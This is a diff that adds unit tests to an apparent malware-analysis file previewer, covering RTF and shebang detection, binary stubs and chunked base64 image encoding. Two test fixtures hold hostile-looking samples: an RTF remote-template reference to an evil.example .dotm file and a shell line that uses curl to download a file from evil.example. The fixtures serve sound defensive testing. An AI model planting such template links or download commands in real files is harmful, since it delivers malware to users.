@@ -27,6 +27,20 @@ describe('previewKind', () => {
     expect(previewKind('', '', '', new TextEncoder().encode('plain words here'))).toBe('text')
     expect(previewKind('', '', '', bytes(0, 1, 2, 3, 0, 255))).toBe('binary')
   })
+
+  it('reads RTF and shebang scripts as source when their bytes are text', () => {
+    // Both have a signature, and both are text: the \object and \*\template
+    // an analyst needs are lost in a 512-byte hex dump.
+    const rtf = new TextEncoder().encode('{\\rtf1{\\*\\template http://evil.example/t.dotm}{\\object\\objemb}}')
+    expect(previewKind('application/rtf', 'x.rtf', 'RTF document', rtf)).toBe('text')
+    const sh = new TextEncoder().encode('#!/bin/sh\ncurl -o /tmp/x http://evil.example/x\n')
+    expect(previewKind('application/x-sh', 'run.sh', 'script with a shebang', sh)).toBe('text')
+  })
+
+  it('keeps a shebang stub glued to a binary payload as bytes, whatever it is declared as', () => {
+    const stub = bytes(0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x0a, 0, 0, 0, 0x7f, 0x45, 0x4c, 0x46)
+    expect(previewKind('application/x-sh', 'run.sh', 'script with a shebang', stub)).toBe('binary')
+  })
 })
 
 describe('imageDataUrl', () => {
@@ -46,6 +60,15 @@ describe('imageDataUrl', () => {
     const big = new Uint8Array(3_000_000)
     big.set(PNG.subarray(0, 8))
     expect(() => imageDataUrl(big, 'PNG image')).not.toThrow()
+  })
+
+  it('encodes every byte exactly, across the chunk boundaries', () => {
+    // 70,000 bytes spans three 0x8000 chunks; every byte value appears.
+    const pic = new Uint8Array(70_000).map((_, i) => (i * 131 + 7) & 0xff)
+    pic.set(PNG.subarray(0, 8))
+    let oneByOne = ''
+    for (const b of pic) oneByOne += String.fromCharCode(b)
+    expect(imageDataUrl(pic, 'PNG image')).toBe(`data:image/png;base64,${btoa(oneByOne)}`)
   })
 
   it('declines an image past the cap rather than building a huge string', () => {
